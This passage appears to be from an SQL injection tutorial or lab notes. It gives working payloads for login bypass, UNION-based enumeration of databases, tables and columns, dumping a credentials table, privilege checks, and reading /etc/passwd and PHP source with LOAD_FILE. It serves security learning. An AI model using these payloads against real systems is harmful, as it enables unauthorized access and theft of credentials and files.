<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">or</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> password </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;something&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>The logic of the query is changed, now it selects the username <code>admin</code> or the password <code>something</code> AND <code>true</code>, which will return False because we don&#x27;t know the actual password.</p>
<p><code>username=&#x27;admin&#x27;</code> will evaluate to true when there&#x27;s a username named <code>admin</code>.
<code>1&#x27;=&#x27;1&#x27; AND password = &#x27;something&#x27;</code> the first part will evaluate to true always, the second part only when the password is the correct one; since we don&#x27;t know it, it will evalute to false. True AND False will evaluate to False.</p>
<p>The <code>OR</code> operator will evaluate to true when one of the two components is true, so we&#x27;ll completely bypass the authentication mechanism.</p>
<p>If we don&#x27;t know the username, we can abuse in the same way of the password field:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;notAdmin&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">or</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> password </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;something&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">or</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="using-comments">Using comments<a href="#using-comments" class="hash-link" aria-label="Direct link to Using comments" title="Direct link to Using comments" translate="no">​</a></h3>
<p>Just like any other language, SQL allows the use of comments as well. We can use <code>#</code> or <code>--</code> to include comments.</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> username </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- Selects usernames from the logins table </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># You can place anything here AND password = &#x27;something&#x27;</span><br></span></code></pre></div></div>
<p>If you introduce comments into the username, it will disable the part of the query that checks the password:</p>
<p>Setting username to <code>admin&#x27;-- </code> will create the following query:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">-- &#x27; AND password = &#x27;something&#x27;;</span><br></span></code></pre></div></div>
<p>And we&#x27;ll have an auth bypass. Sometimes SQL queries use parenthesis which might need to be taken into account when generating the payload, for example:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> password </span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;e7df7cd2ca07f4f1ab415d457a6e1c13&quot;</span><br></span></code></pre></div></div>
<p>If we input username as <code>admin&#x27;)--</code> we will disable the password part and close the parenthesis correctly:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> logins </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">-- AND id &gt; 1) AND password == &quot;e7df7cd2ca07f4f1ab415d457a6e1c13&quot;</span><br></span></code></pre></div></div>
<p>and we&#x27;ll have another auth bypass.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="union">Union<a href="#union" class="hash-link" aria-label="Direct link to Union" title="Direct link to Union" translate="no">​</a></h3>
<p>The <code>union</code> statement can be use to combine the fields coming from two separate selects. For example:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> ports</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">----------+-----------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> code     </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> city      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">----------+-----------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> CN SHA   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Shanghai  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> SG SIN   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Singapore </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ZZ</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">21</span><span class="token plain">    </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Shenzhen  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">----------+-----------+</span><br></span></code></pre></div></div>
<p>and</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql&gt; SELECT * FROM ships;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+----------+-----------+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| Ship     | city      |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+----------+-----------+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| Morrison | New York  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+----------+-----------+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1 rows in set (0.00 sec)</span><br></span></code></pre></div></div>
<p>We can use <code>union</code> to combine both selects:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> ports </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> ships</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">----------+-----------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> code     </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> city      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">----------+-----------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> CN SHA   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Shanghai  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> SG SIN   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Singapore </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Morrison </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> New York  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ZZ</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">21</span><span class="token plain">    </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Shenzhen  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">----------+-----------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">rows</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.00</span><span class="token plain"> sec</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>The number of columns and data types of the combine data tables should be the same. For example:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> city </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> ports </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> ships</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ERROR </span><span class="token number" style="color:#36acaa">1222</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">21000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: The used </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> statements have a different number </span><span class="token keyword" style="color:#00009f">of</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">columns</span><br></span></code></pre></div></div>
<p>When the number of columns doesn&#x27;t fit, you can just use a number to fill the missing columns.</p>
<p>We can use <code>UNION</code> as another source of injections. For example in the query:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> products </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> product_id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;user_input&#x27;</span><br></span></code></pre></div></div>
<p>We can enter the following payload:</p>
<p><code>1&#x27; UNION SELECT username, password from passwords-- </code></p>
<p>which will end up in the following query:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> products </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> product_id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> password </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> passwords</span><span class="token comment" style="color:#999988;font-style:italic">-- &#x27;</span><br></span></code></pre></div></div>
<p>and will reveal usernames and passwords.</p>
<p>If the number of columns are not the same, use the previous trick to make the query work:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> passwords</span><span class="token comment" style="color:#999988;font-style:italic">-- &#x27;</span><br></span></code></pre></div></div>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> products </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> product_id </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> passwords</span><span class="token comment" style="color:#999988;font-style:italic">-- &#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">-----------+-----------+-----------+-----------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> product_1 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> product_2 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> product_3 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> product_4 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">-----------+-----------+-----------+-----------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   admin   </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">-----------+-----------+-----------+-----------+</span><br></span></code></pre></div></div>
<p>As seen in this example, we might need to know exactly the numbers of columns of a table. In order to do so, we can use <code>ORDER BY</code> statement:</p>
<p><code>&#x27; order by 1-- -</code>, we can keep up incrementing the number until the query fails to execute, then we found the number of columns.</p>
<p>We can use <code>UNION</code> itself to detect the number of columns, e.g:</p>
<p><code>cn&#x27; UNION select 1,2,3-- -</code>. We add numbers until it works.</p>
<p>We also need to know which columns are printed into the application. We can inject junk data and see how it gets printed in the frontend, for example:</p>
<p><code>cn&#x27; UNION select 1,@@version,3,4-- -</code>.</p>
<p>This way, we have found where we need to put our injection.</p>
<p>Once we have the SQL injection working, we can run some interesting queries:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> SCHEMA_NAME </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> INFORMATION_SCHEMA</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">SCHEMATA</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">--------------------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> SCHEMA_NAME        </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">--------------------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> mysql              </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> information_schema </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> performance_schema </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> ilfreight          </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> dev                </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">+</span><span class="token comment" style="color:#999988;font-style:italic">--------------------+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">rows</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.01</span><span class="token plain"> sec</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>This finds all the available database in the server.</p>
<p>We can find the current database with <code>SELECT database()</code>.</p>
<p>We can use information schema database and tables table to retrieve a list of all the available tables:</p>
<p><code>cn&#x27; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#x27;dev&#x27;-- -</code></p>
<p>Here, we&#x27;re using UNION SQL injection to dump all the tables available for the database <code>dev</code>.</p>
<p>A similar thing can be done to retrieve the columns of certain table:</p>
<p><code>cn&#x27; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#x27;credentials&#x27;-- -</code></p>
<p>This will list the columns of the table named <code>credentials</code>.</p>
<p>Now we can dump the data in the credentials table:</p>
<p><code>cn&#x27; UNION select 1, username, password, 4 from dev.credentials-- -</code></p>
<p>Note the dot operator: the application is using another database than <code>dev</code>. The dot operator is need to access other than the configured database.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reading-files">Reading files<a href="#reading-files" class="hash-link" aria-label="Direct link to Reading files" title="Direct link to Reading files" translate="no">​</a></h2>
<p>Under certain conditions databases might be able to read files.</p>
<p>The users have certain privileges configured, so first we need to gather which privileges the application user has.</p>
<p>First, we need to know what user is the application using to deal with the data:</p>
<p><code>cn&#x27; UNION SELECT 1, user, 3, 4 from mysql.user-- -</code></p>
<p>Now we can determine the privileges of the user:</p>
<p><code>cn&#x27; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></p>
<p><code>cn&#x27; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee=&quot;&#x27;root&#x27;@&#x27;localhost&#x27;&quot;-- -</code></p>
<p>If <code>FILE</code> privilege is granted, we can read files. Reading files cannot be simpler (if everything is setup correctly):</p>
<p><code>cn&#x27; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></p>
<p>This will dump the contents of <code>/etc/passwd</code>. We can dump the source code of the current php script as well:</p>
<p><code>cn&#x27; UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- -</code>. The problem is that the code is rendered, however, we can check the HTML source of the page and we&#x27;ll see the PHP code.</p>
